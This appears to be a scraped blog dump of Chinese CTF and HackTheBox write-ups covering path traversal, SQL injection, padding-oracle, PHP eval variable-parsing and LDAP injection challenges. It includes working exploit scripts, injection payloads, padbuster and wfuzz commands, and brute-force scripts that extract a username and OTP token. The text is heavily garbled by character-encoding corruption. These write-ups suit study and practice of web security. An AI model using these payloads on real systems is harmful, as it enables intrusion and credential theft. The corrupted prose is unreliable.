è€ƒç‚¹ æ–‡ä»¶åŒ…å« è§£é¢˜ åšçš„æ—¶å€™è¿™é“é¢˜çœŸçš„æ˜¯ã€‚ã€‚ä¸€è¨€éš¾å°½ F12å¯ä»¥çœ‹åˆ°ä¸»é¡µå›¾ç‰‡çš„é“¾æ¥http://183.129.189.60:10009/image.php?t=XXXXXX&amp;f=XXXXXXX å‚æ•°tæ˜¯æ—¶é—´æˆ³ï¼Œå‚æ•°fæ˜¯è¦åŒ…å«çš„æ–‡ä»¶åbase64ç¼–ç ï¼Œå°è¯•ç›´æ¥è¯»image.phpå’Œindex.phpéƒ½æ²¡æœ‰ä»»ä½•å›æ˜¾ï¼Œåº”è¯¥æ˜¯å‰é¢æ‹¼æ¥äº†è·¯å¾„ï¼Œæ¯”å¦‚è¯´/var/www/html/img/ï¼Œè€Œä¸”è¿‡æ»¤äº†../ç­‰è·¯å¾„ç©¿è¶Šçš„å­—ç¬¦ï¼Œå¹¶ä¸”wrapperç­‰æ‰‹æ®µçš„ã€‚ æƒ³äº†åŠå¤©æ„Ÿè§‰è¿™æ ·åº”è¯¥æ˜¯ç»å¯¹å®‰å…¨çš„ã€‚ã€‚ç»“æœåæ¥å‘ç°ï¼Œå¦‚æœfå‚æ•°çš„å¼€å¤´ç»™å‡ºä¸€ä¸ªç›®å½•å†ç©¿è¶Šå°±å¯ä»¥ç»•è¿‡wafäº†ã€‚ è„šæœ¬ï¼š 1234567891011import requestsimport timeimport base64URL = &#x27;http://183.129.189.60:10009/image.php&#x27;timestamp = int(time.time())payload = &#x27;gqy.jpg/../../../../../flag&#x27;params = &#123;&#x27;t&#x27;: timestamp, &#x27;f&#x27;: base64.b64encode(payload.encode(&#x27;utf-8&#x27;))&#125;r = requests.get(url=URL, params=params)print(r.text) é¡ºä¾¿çœ‹ä¸€ä¸‹æºç  123456789101112131415161718192021222324&lt;?php if(!isset($_GET[&#x27;t&#x27;]) || !isset($_GET[&#x27;f&#x27;]))&#123; echo &quot;you miss some parameters&quot;; exit(); &#125; $timestamp = time(); if(abs($_GET[&#x27;t&#x27;] - $timestamp) &gt; 10)&#123; echo &quot;what&#x27;s your time?&quot;; exit(); &#125; $file = base64_decode($_GET[&#x27;f&#x27;]); if(substr($file, 0, strlen(&quot;/../&quot;)) === &quot;/../&quot; || substr($file, 0, strlen(&quot;../&quot;)) === &quot;../&quot; || substr($file, 0, strlen(&quot;./&quot;)) === &quot;./&quot; || substr($file, 0, strlen(&quot;/.&quot;)) === &quot;/.&quot; || substr($file, 0, strlen(&quot;//&quot;)) === &quot;//&quot;) &#123; echo &#x27;You are not allowed to do that.&#x27;; &#125; else&#123; echo file_get_contents(&#x27;/var/www/html/img/&#x27;.$file); &#125;?&gt; SQLi è€ƒç‚¹ bypass information_schema è§£é¢˜ å¤ªèœäº†ã€‚ã€‚ç¬¬äºŒé¢˜å°±ä¸ä¼šäº†ã€‚ èµ›åçœ‹y1ngå¸ˆå‚…çš„writeupï¼šhttps://www.gem-love.com/ctf/2514.html è¿‡æ»¤äº†å…³é”®å­— 1return preg_match(&quot;&#x2F;;|benchmark|\\^|if|[\\s]|in|case|when|sleep|auto|desc|stat|\\||lock|or|and|&amp;|like|-|&#96;&#x2F;i&quot;, $id); ç”¨sys.x$schema_flattened_keysæ¥ç»•è¿‡information_schema æœ‰å›æ˜¾ç›´æ¥è”åˆæ³¨å…¥ 1100%27&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;group_concat(table_name),2,3&#x2F;**&#x2F;FROM&#x2F;**&#x2F;&#x2F;**&#x2F;sys.x$schema_flattened_keys&#x2F;**&#x2F;WHERE&#x2F;**&#x2F;table_schema&#x3D;&#39;sqlidb&#39;&#x2F;**&#x2F;GROUP&#x2F;**&#x2F;BY&#x2F;**&#x2F;table_name&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1%23 å¦å¤–ä¹Ÿå¯ä»¥ç›²æ³¨ï¼ŒæŠŠè¡¨åç»™æ³¨å‡ºæ¥ 12345678910111213141516171819202122232425#!/usr/bin/env python3#-*- coding:utf-8 -*-#__author__: é¢–å¥‡L&#x27;Amore www.gem-love.comimport requests as reqimport time as timport base64 as bimport stringalpa = string.ascii_letters + string.digitsres = &#x27;&#x27;#åº“å åˆ©ç”¨limitæ³¨å…¥ sqlidb# http://183.129.189.60:10004/?id=1%27limit/**/1,1/**/PROCEDURE/**/ANALYSE(1)%23#è¡¨å flllaaagggpayload = &#x27;&#x27;&#x27;SELECT group_concat(table_name) FROM sys.x$schema_flattened_keys WHERE table_schema=&#x27;sqlidb&#x27; GROUP BY table_name limit 0,1&#x27;&#x27;&#x27;for i in range(1,100): for char in alpa: host = &#x27;&#x27;&#x27;http://183.129.189.60:10004/?id=1&#x27;=(substr((&#123;payload&#125;),&#123;i&#125;,1)=&#x27;&#123;char&#125;&#x27;)%23&#x27;&#x27;&#x27;.format(payload=payload.replace(&#x27; &#x27;,&#x27;/**/&#x27;), i=i, char=char) r = req.get(host) if r&#x27;admin666&#x27; in r.text: res += char print(&quot;found it: &quot;+res) break t.sleep(0.2) å†ç”¨è”åˆæŸ¥è¯¢è·å¾—flag 1100&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*,1&#x2F;**&#x2F;from&#x2F;**&#x2F;flllaaaggg%23 Homebrew Dubbo v2 å¾…å¡«å‘ã€‚ã€‚ã€‚ ç­‰ä¸€æ‰‹ä¸‹ä¸ªæ˜ŸæœŸæ‰¾è€æ¿çš„ç›´æ’­è®²è§£ã€‚","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"HackTheBox-Challenge-Web","date":"2020-07-15T03:31:00.000Z","path":"Target_drone/HackTheBox/0.HackTheBox-Challenge-Web/","text":"HackTheBox Challenge Web I know Mag1k æ‰“å¼€é¢˜ç›®æœ‰ç™»å½•æ³¨å†Œçš„é¡µé¢ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å· æœ‰ä¸€ä¸ªcookieå¾ˆå¥‡æ€ªï¼Œæ„Ÿè§‰åƒæ˜¯base64ç¼–ç  è¿™ä¸ªåœ°æ–¹å°±æ¶‰åŠåˆ°Padding Oracle attacksï¼ˆå¡«å……æç¤ºæ”»å‡»ï¼‰ï¼Œå¾ˆå¤šå¹´å‰çš„æ”»å‡»æ–¹å¼äº†ï¼Œã€Šç™½å¸½å­è®²webå®‰å…¨ã€‹ä¸­æœ‰æåˆ°è¿‡è¿™ç§æ”»å‡»æ‰‹æ³•ã€‚ ç›´æ¥ä½¿ç”¨å·¥å…·padbusterã€‚ 1padbuster http:&#x2F;&#x2F;docker.hackthebox.eu:30921&#x2F;profile.php Y5MXsRyBPFqBPlu3z8p7S2OO%2FGe9sLQ5X1khXeMdHfkcsgbngE3xDA%3D%3D 8 --cookies iknowmag1k&#x3D;Y5MXsRyBPFqBPlu3z8p7S2OO%2FGe9sLQ5X1khXeMdHfkcsgbngE3xDA%3D%3D å…¶ä¸­è¿™ä¸ªå‘½ä»¤å‚æ•°8æŒ‡çš„æ˜¯è§£å¯†çš„å—å¤§å°ï¼Œä¸€å…±åªæœ‰ä¸‰ä¸ªå€¼ï¼š8ï¼Œ16ï¼Œ32","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"PHPå¤æ‚å˜é‡è§£æ","date":"2020-07-14T00:43:52.000Z","path":"Web_security/php_related/11.PHPå¤æ‚å˜é‡è§£æ/","text":"PHPå¤æ‚å˜é‡è§£æå­¦ä¹  0x01 åŸºç¡€çŸ¥è¯† å•å¼•å·å’ŒåŒå¼•å·çš„åŒºåˆ« 1234&lt;?php$test=&#x27;hello worldï¼&#x27;;echo &quot;$test&quot;;echo &#x27;$test&#x27;; è¾“å‡ºçš„ç»“æœæ˜¯ 12hello world!$test ä¹Ÿå°±æ˜¯è¯´ï¼ŒPHPä¸­çš„å•å¼•å·ä¼šç›´æ¥è§£ææˆå­—ç¬¦ä¸²ï¼Œè€Œå¦‚æœæ˜¯åŒå¼•å·ï¼Œé‚£ä¹ˆPHPä¼šé¦–å…ˆå»çœ‹åŒå¼•å·é‡Œé¢æœ‰æ²¡æœ‰å˜é‡ï¼Œå¦‚æœæœ‰å˜é‡çš„è¯é‚£ä¹ˆä¼šå…ˆè¿›è¡Œå˜é‡è§£æï¼Œå³æ›¿æ¢æˆå®ƒçš„å€¼ã€‚ å˜é‡çš„è¯†åˆ« é¦–å…ˆçœ‹ä¸€ä¸‹æ–‡æ¡£é‡Œé¢æ˜¯æ€ä¹ˆå®šä¹‰å¤æ‚è§£æçš„ ä¸¾ä¸€ä¸ªä¾‹å­å®¹æ˜“äº†è§£èŠ±æ‹¬å·çš„ä½œç”¨ï¼š 12345&lt;?php$test=&quot;hello world!&quot;;echo &quot;$&#123;test&#125;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&#123;$test&#125;&quot;; è¾“å‡ºçš„ç»“æœæ˜¯ï¼š 12hello world!hello world! å¦å¤–ä¸€ä¸ªä¾‹å­ï¼š 123&lt;?php$fruit=&quot;apple&quot;;echo &quot;there are many &#123;$fruit&#125;s&quot;; è¾“å‡ºç»“æœï¼š 1there are many apples ç»“åˆä¸¤ä¸ªä¾‹å­å¯ä»¥çŸ¥é“ï¼ŒèŠ±æ‹¬å·èµ·åˆ°æ ‡è®°å˜é‡çš„ç•Œé™çš„ä½œç”¨ï¼Œåœ¨ç¬¬äºŒä¸ªä¾‹å­ä¸­å¦‚æœæ²¡æœ‰èŠ±æ‹¬å·é‚£ä¹ˆphpå°†ä¼šæŠŠå˜é‡è¯†åˆ«ä¸º$fruitsè¿›è€Œä½¿ç»“æœå¼‚å¸¸ã€‚å¦å¤–ä¹Ÿè¯´æ˜phpä¼šå°½é‡å¤šåœ°å–ç»„åˆå¯ç”¨çš„å­—ç¬¦ä½œä¸ºå˜é‡åã€‚ èŠ±æ‹¬å·ä¸­ä½¿ç”¨å‡½æ•°ï¼Œæ–¹æ³•ï¼Œé™æ€ç±»å˜é‡å’Œç±»å¸¸é‡ 12345678&lt;?php$Hed9eh0g=&quot;test&quot;;function getname()&#123; echo &quot;Hed9eh0g&quot;; echo &quot;&lt;br&gt;&quot;; return &quot;Hed9eh0g&quot;;&#125;echo &quot;$&#123;getname()&#125;&quot;; è¾“å‡ºç»“æœï¼š 12Hed9eh0gtest å¯ä»¥çœ‹å‡ºåœ¨åŒå¼•å·åŒ…è£¹çš„$&#123;&#125;è¿™ç§å½¢å¼å†…éƒ¨å¦‚æœæœ‰æ–¹æ³•åï¼Œåˆ™è¿™ä¸ªæ–¹æ³•æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œæœ¬ä¾‹å­ä¸­é¦–å…ˆæ‰§è¡Œäº†echoè¯­å¥ï¼Œç„¶åå†returnå¯¹åº”çš„å€¼Hed9eh0gï¼Œä¸å¤–å±‚å½¢æˆæ–°çš„ç»“æœâ€‹$&#123;Hed9eh0g&#125;ï¼Œæ­¤æ—¶phpä¼šå°†å…¶è¯†åˆ«ä¸ºä¸€ä¸ªå˜é‡ï¼Œç„¶åè¿›è¡Œè§£æå¹¶æ›¿æ¢æˆå…¶å¯¹åº”çš„ç»“æœã€‚ å¦‚æœå†åœ¨getname()å¤–å±‚åŒ…è£¹ä¸€å±‚â€‹$&#123;&#125;ï¼Œé‚£ä¹ˆç»“æœå°†ä¼šæŠ¥é”™ï¼Œå› ä¸ºæ ¹æ®åˆšæ‰çš„æ¨ç†å¯çŸ¥phpæœ€ç»ˆä¼šè¯†åˆ«$testä¸ºä¸€ä¸ªå˜é‡ï¼Œè€Œè¿™æ˜¯ä¸€ä¸ªæˆ‘ä»¬æ²¡æœ‰å®šä¹‰è¿‡çš„å˜é‡ã€‚ è™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯ä¸å½±å“getnameå‡½æ•°çš„echoè¯­å¥çš„æ‰§è¡Œã€‚ 0x02 ç»ƒä¹  123456&lt;?phphighlight_file(__FILE__);$str = @(string)$_GET[&#x27;str&#x27;];eval(&#x27;$str = &quot;&#x27;.addslashes($str).&#x27;&quot;;&#x27;);?&gt; ä¸¤ç§payloadï¼Œåˆ†åˆ«æ˜¯ï¼š?str=&#123;$&#123;phpinfo()&#125;&#125;å’Œ?str=$&#123;$&#123;phpinfo()&#125;&#125; evalå‡½æ•°å°†å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œï¼Œå› æ­¤ï¼Œé€šè¿‡å›¾ä¸­ä»£ç æ¸…æ™°å¯è§ç›¸å½“äºå®šä¹‰äº†strå˜é‡ï¼Œèµ‹å€¼ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²&#123;$&#123;phpinfo()&#125;&#125;ã€‚ $str = &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;ï¼ŒèŠ±æ‹¬å·å®šä¹‰äº†å˜é‡çš„è¾¹ç•Œï¼Œå› æ­¤è¯¥æ¡è¯­å¥å…ˆæ‰§è¡Œæ‹¬å·ä¸­å†…å®¹ï¼Œè·å–å‡½æ•°è¿”å›å€¼ï¼Œå¹¶ä»¥è¿”å›å€¼çš„stringå‘½åå˜é‡å†èµ‹å€¼ç»™strå˜é‡ã€‚ å¹¶ä¸”ç¬¬äºŒä¸ªpayloadä¼šæŠ¥ä¸€ä¸ªé”™è¯¯ å‡½æ•°phpinfoï¼Œä¼šè¿”å› trueï¼Œå› ä¸º trueï¼Œæ˜¯boolç±»å‹çš„å˜é‡ï¼Œç„¶åè¿›è¡Œç±»å‹è½¬åŒ–ï¼Œè½¬åŒ–ä¸ºå­—ç¬¦ä¸²1,æ‰€ä»¥è°ƒç”¨çš„å‚æ•°å°±æ˜¯$1ï¼Œè¿™ä¹Ÿæ˜¯ä¸Šé¢ç¬¬äºŒä¸ªpayloadæŠ¥é”™ä¸ºUndefined variable: 1çš„åŸå› ã€‚ 0x03 ç»§ç»­æ€è€ƒ å¦‚æœå°†addslashes ç”¨å•å¼•å·åŒ…è£¹ 123456&lt;?phphighlight_file(__FILE__);$str &#x3D; @(string)$_GET[&#39;str&#39;];eval(&quot;$str &#x3D; &#39;&quot;.addslashes($str).&quot;&#39;;&quot;);?&gt; å†è¯•ä¸€ä¸‹è¿™ä¸¤ä¸ªpayload &#123;$&#123;phpinfo()&#125;&#125;æ‰§è¡Œå¤±è´¥ $&#123;$&#123;phpinfo()&#125;&#125;æ‰§è¡ŒæˆåŠŸã€‚ å¤æ‚å˜é‡è§£æçš„å‰ææ˜¯åŒå¼•å·åŒ…è£¹,ç¬¬äºŒæ¬¡å®éªŒä¸­ï¼Œaddslasheså‡½æ•°éƒ¨åˆ†è¢«å•å¼•å·åŒ…è£¹ï¼Œæ‰€ä»¥åªæ˜¯ç®€å•çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯å‰é¢$strå´æ˜¯è¢«åŒå¼•å·åŒ…è£¹ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œå¤æ‚å˜é‡è§£æã€‚ é‚£ä¹ˆpayload1çš„&#123;$&#123;phpinfo()&#125;&#125;å’Œpayload2çš„â€‹$&#123;$&#123;phpinfo()&#125;&#125;çœ‹æ ·å­éƒ½å¯ä»¥è¿›è¡Œè§£æä¹‹åæ‰§è¡Œå‡½æ•°ï¼Ÿä½†äº‹å®ä¸Šå´åªæœ‰payload2å¯ä»¥å®ç°ã€‚é—®é¢˜å‡ºåœ¨å“ªï¼Ÿ è¿™é‡Œæ³¨æ„äº†ï¼Œâ€‹$stræ­¤æ—¶æ˜¯å·¦å€¼ï¼Œä¹Ÿå³ä½äºèµ‹å€¼è¯­å¥çš„å·¦ä¾§ï¼Œè€Œå·¦å€¼å¿…é¡»å¾—æ˜¯ä¸€ä¸ªå˜é‡ï¼Œä¹Ÿå³å¿…é¡»ç”±å­—ç¬¦$å¼€å¤´ï¼Œæ˜¾ç„¶payload1çš„å¼€å¤´å­—ç¬¦æ˜¯{ï¼Œå› æ­¤å®ƒå‹æ ¹ä¸æ˜¯ä¸€ä¸ªå˜é‡ï¼Œæ­¤æ—¶å‰é¢æˆ‘ä»¬æ‰€è°ˆçš„å˜é‡è§£æçš„ç‰¹æ€§éƒ½æ²¡æœ‰ç”¨ã€‚ 0x04 å‚è€ƒæ–‡ç«  ADæ”»é˜²å®éªŒå®¤ https://www.anquanke.com/post/id/176331#h2-4","tags":[{"name":"Webå®‰å…¨åŸºç¡€","slug":"Webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"PHPå˜é‡è§£æ","slug":"PHPå˜é‡è§£æ","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/"}],"categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"Webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"HTB::CTF_walkthrough","date":"2020-07-11T13:10:03.000Z","path":"Target_drone/HackTheBox/17.HTB-CTF-walkthrough/","text":"HackTheBox::CTF Walkthrough 0x01 Info Card Column Details Name CTF IP 10.10.10.122 Points 50 OS Linux Difficulty Insane Creator 0xEA31 0x02 Tools and Tips Python Scripting LDAP Injection Wildcard and Symlink abuse 0x03 Initial Enumeration Nmap 123456789101112131415# Nmap 7.80 scan initiated Fri Jul 10 10:50:40 2020 as: nmap -sC -sV -oN ctf 10.10.10.122Nmap scan report for ctf.htb (10.10.10.122)Host is up (1.8s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:| 2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)| 256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)|_ 256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16)|_http-server-header: Apache&#x2F;2.4.6 (CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .# Nmap done at Fri Jul 10 11:03:44 2020 -- 1 IP address (1 host up) scanned in 783.74 seconds æŸ¥çœ‹80ç«¯å£ å¤§æ¦‚çš„æ„æ€å°±æ˜¯è®©æˆ‘ä»¬å°è¯•å»ç™»å½•è¿™ä¸ªç³»ç»Ÿï¼Œä½†æ˜¯ä¸èƒ½ç”¨SQLmapæˆ–è€…Dirbusterå»æš´åŠ›çŒœè§£ç”¨æˆ·åå’Œå¯†ç ã€‚ å†å»ç™»å½•ç•Œé¢çœ‹ä¸€ä¸‹ï¼š æç¤ºæˆ‘ä»¬æ˜¯ä¸€ä¸ªOTPï¼ŒåŠOne Time Passwordï¼Œä¸€èˆ¬è€Œè¨€æ˜¯1åˆ†é’Ÿæ›´æ–°ä¸€æ¬¡ã€‚ æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ªHint å¦‚æœæ¯”è¾ƒç†Ÿæ‚‰LDAPçš„è¯ï¼Œè¿™é‡Œçš„ä¸¤ä¸ªåè¯schemaå’Œattributeå·²ç»æç¤ºäº†æ˜¯å…³äºLDAPæ³¨å…¥ã€‚ é¶æœºä½œè€…ç”¨ä¸€ä¸ªå·²çŸ¥çš„å±æ€§å»å­˜å‚¨äº†81ä½çš„token stringï¼ŒGoogleæœä¸€ä¸‹token string (81 digits)ã€‚ https://www.systutorials.com/docs/linux/man/1-stoken/ å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå…³é”®çš„åœ°æ–¹ï¼ŒPure numeric (81-digit) &quot;ctf&quot; (compressed token format) stringsï¼Œå’Œé¶æœºçš„é¢˜ç›®ç›¸å¥‘åˆï¼Œç°åœ¨å°±æœ‰ä¸€ç‚¹æ€è·¯äº†ï¼Œåº”è¯¥è¦å»æ‰¾åˆ°è¿™ä¸ª81ä½çº¯æ•°å­—çš„tokenï¼Œç„¶åç”¨stokenå·¥å…·å»ç”ŸæˆOTPã€‚ç°åœ¨å°±ä¸»è¦æ˜¯æ‰¾åˆ°tokenï¼Œå”¯ä¸€å¯ä»¥åˆ©ç”¨çš„å°±æ˜¯è¿™ä¸ªç™»å½•æ¡†äº†ã€‚ å…ˆéšä¾¿ç”¨æŸä¸ªç”¨æˆ·åå’Œå¯†ç ç™»å½•admin:1234 è¿”å›User admin not foundï¼Œå†ç”¨SQLæ³¨å…¥çš„ä¸‡èƒ½å¯†ç è¯•ä¸€è¯• ç›´æ¥æ˜¯æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œåº”è¯¥æ˜¯å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦æœ‰é»‘åå•è¿‡æ»¤ã€‚Fuzzä¸€ä¸‹è¿‡æ»¤äº†ä¸€äº›ä»€ä¹ˆå­—ç¬¦ 1wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w special-chars.txt 10.10.10.122&#x2F;login.php â€“hw 233 ä»£è¡¨è¿‡æ»¤æ‰å½¢å¦‚User xxx not foundçš„è¿”å›ä¿¡æ¯ã€‚ æˆ‘ä»¬å‘ç°+å’Œ&amp;è¿”å›çš„æ˜¯232 Wordsï¼Œä½†æ˜¯åœ¨é¡µé¢æµ‹è¯•ä¸€ä¸‹ å‘ç°è¿”å›çš„è¿˜æ˜¯User + not foundæˆ–è€…User &amp; not foundï¼Œè¿™æ ·çš„è¯åº”è¯¥æ˜¯233 Wordsï¼Œè€Œä¸æ˜¯Wfuzzè¿”å›çš„232 Wordsã€‚ æˆ‘ä»¬å°è¯•æŠŠè¿™äº›ç‰¹æ®Šå­—ç¬¦äºŒæ¬¡URLç¼–ç ï¼Œçœ‹Webåº”ç”¨æ˜¯å¦è¿˜èƒ½è§£æï¼Œç”¨seclistsä¸­çš„doble_uri_hex.txtä½œä¸ºå­—å…¸ 1wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w doble-uri-hex.txt 10.10.10.122&#x2F;login.php æœ€åFuzzå‡ºæ¥çš„è¢«è¿‡æ»¤çš„å­—ç¬¦å°±æ˜¯ 12345%2500 ---&gt; %00%2528 ---&gt; (%2529 ---&gt; )%252a ---&gt; *%255c ---&gt; \\ è¿™äº›è¢«è¿‡æ»¤çš„å­—ç¬¦å°±æ˜¯LDAPæ³¨å…¥éœ€è¦è¿‡æ»¤çš„æ‰€æœ‰å­—ç¬¦ï¼Œå†ç»“åˆlogin.phpé¡µé¢æºä»£ç ä¸­çš„hintï¼Œå¯ä»¥ç¡®å®šæ˜¯LDAPæ³¨å…¥ã€‚ 0x04 Getting User Access å…ˆæ¥çœ‹LDAPæ³¨å…¥çš„æœ€åŸºæœ¬å½¢å¼ 1234(&amp; (password&#x3D;1234) (uid&#x3D;ca01h%00)) å…·ä½“åˆ°è¿™ä¸ªé¶æœºçš„è¯ï¼Œæˆ‘ä»¬éœ€è¦çŒœè§£æ‹¬å·çš„ä¸ªæ•°ã€‚è¿ç”¨ç±»ä¼¼ç›²æ³¨çš„æ€æƒ³ï¼Œå¦‚æœæ³¨å…¥æˆåŠŸï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›User ca01h not foundã€‚ å‡è®¾åªæœ‰ä¸€ä¸ªæ‹¬å·ï¼š å‡è®¾æœ‰ä¸¤ä¸ªæ‹¬å·ï¼š å‡è®¾æœ‰ä¸‰ä¸ªæ‹¬å·ï¼š å½“å°è¯•åˆ°ä¸‰ä¸ªæ‹¬å·ç”¨äºé—­åˆæ—¶ï¼ŒæˆåŠŸè¿”å›äº†User ca01h%29%29%29%00 not foundï¼Œé‚£ä¹ˆè¿™ä¸ªç™»å½•æ¡†çš„LDAPæŸ¥è¯¢çš„åŸºæœ¬å½¢å¼å°±æ˜¯ 123456789(&amp; (&amp; (password&#x3D;1234) (uid&#x3D;ca01h)))%00 ) (&amp;| (other comparing) )) æ¥ç€ï¼Œæˆ‘ä»¬å†å›å¤´å»çœ‹ä¸€ä¸‹Fuzzå‡ºæ¥çš„è¢«è¿‡æ»¤çš„å­—ç¬¦ï¼Œå…¶ä¸­%25%2aè¿”å›çš„æ¶ˆæ¯é•¿åº¦ä¸º231 Words å‘ç°å›æ˜¾çš„æ¶ˆæ¯æ˜¯Cannot loginï¼Œè¯´æ˜å¯ä»¥ç”¨*é€šé…ç¬¦æ¥ç›²æ³¨ç”¨æˆ·åï¼Œè„šæœ¬å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python3### username_burp.pyimport sysimport timefrom string import ascii_lowercasefrom urllib.parse import quote_plusimport requestsURL = &#x27;http://10.10.10.122/login.php&#x27;username, done = &#x27;&#x27;, Falseprint()while not done: for c in ascii_lowercase: payload = username + c + quote_plus(&#x27;*&#x27;) data = &#123; &#x27;inputUsername&#x27;: payload, &#x27;inputOTP&#x27;: &#x27;1234&#x27; &#125; resp = requests.post(URL, data=data) if &#x27;Cannot login&#x27; in resp.text: username += c break sys.stdout.write(f&#x27;\\r&#123;username&#125;&#123;c&#125;&#x27;) time.sleep(0.2) else: done = Trueprint(f&#x27;[+] Username: &#123;username&#125; \\n&#x27;) ç”¨æˆ·åä¸ºldapuser çŸ¥é“äº†ç”¨æˆ·åä¹‹åï¼Œæˆ‘ä»¬å°±è¦å»è·å–ç”ŸæˆOTPçš„81ä½tokenï¼Œé€šè¿‡é¡µé¢æºä»£ç çš„æç¤ºï¼Œè¿™ä¸ªtokenå­˜å‚¨åœ¨æŸä¸€ä¸ªLDAPé»˜è®¤å·²ç»å­˜åœ¨çš„å±æ€§å½“ä¸­ã€‚è€Œé»˜è®¤çš„å±æ€§å¯ä»¥åœ¨PayloadsAllTheThingsä¸­æ‰¾åˆ°ï¼š 123456789101112131415161718192021222324252627ccncocommonNamedcfacsimileTelephoneNumbergivenNamegnhomePhoneidjpegPhotolmailmobilenameoobjectClassouownerpagerpasswordsnstsurnameuidusernameuserPassword å¦‚æœä¸æƒ³å†™è„šæœ¬çš„è¯ç”¨wfuzzæ¥Fuzzé¶æœºçš„LDAPä¸­å­˜åœ¨çš„å±æ€§å¯èƒ½ä¼šæ›´å¿«ä¸€äº›ï¼Œä½†è¿˜æ˜¯è¦å…ˆæ‰¾åˆ°æ³¨å…¥çš„å½¢å¼ï¼š 12345678910(&amp; (&amp; (password&#x3D;1234) (uid&#x3D;ldapuser) (FUZZ&#x3D;*) ) (&amp;| (other comparing) )) æ­¤å¤–è¿˜è¦æŠŠæ³¨å…¥çš„å­—ç¬¦ldapuser)(FUZZ=*è¿›è¡ŒäºŒæ¬¡URLç¼–ç ï¼Œç¼–ç ä¹‹åçš„ç»“æœldapuser%2529%2528FUZZ%253d%252aã€‚ 1wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;ldapuser%2529%2528FUZZ%253d%252a&amp;inputOTP&#x3D;1234&#39; -w LDAP_attributes.txt http:&#x2F;&#x2F;10.10.10.122&#x2F;login.php æˆ‘ä»¬Fuzzå‡ºæ¥äº†è¿™ä¹ˆäº›å±æ€§æ˜¯å­˜åœ¨äºé¶æœºçš„LDAPæœåŠ¡ä¸­çš„ï¼Œç°åœ¨çš„å·¥ä½œå°±æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„å±æ€§æ¥çŒœè§£ï¼Œå±äºä¸€äº›é‡å¤æ€§çš„å·¥ä½œï¼Œå°±ä¸åœ¨è¿™é‡Œè¿‡å¤šèµ˜è¿°äº†ï¼Œæœ€åå¯ä»¥æ‰¾åˆ°tokenæ˜¯å­˜å‚¨äºpagerå±æ€§ä¸­ã€‚æ¥ç€å†™è„šæœ¬burp81ä½token 1234567891011121314151617181920212223242526272829#!/usr/bin/python3# pager_burp.pyimport requestsimport sysfrom time import sleepfrom string import digitstoken = &quot;&quot;URL = &quot;http://10.10.10.122/login.php&quot;attribute = &quot;pager&quot;loop = 1while loop &gt; 0: for digit in digits: token = token # ldapuser)(pager=&lt;token&gt;)* payload = f&quot;ldapuser%29%28&#123;attribute&#125;%3d&#123;token&#125;&#123;digit&#125;%2a&quot; data = &#123;&quot;inputUsername&quot;: payload, &quot;inputOTP&quot;: &quot;1234&quot;&#125; r = requests.post(URL, data=data) sys.stdout.write(f&quot;\\rToken: &#123;token&#125;&#123;digit&#125;&quot;) sleep(0.5) if b&quot;Cannot login&quot; in r.content: token += digit break elif digit == &quot;9&quot;: loop = 0 breakprint(f&#x27;[+] Token: &#123;token&#125; \\n&#x27;) è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯éœ€è¦åˆ æ‰æœ€åçš„ä¸€ä¸ª9ï¼Œæ‰€ä»¥æœ€åçš„tokenå°±æ˜¯ï¼š 1285449490011357156531651545652335570713167411445727140604172141456711102716717000 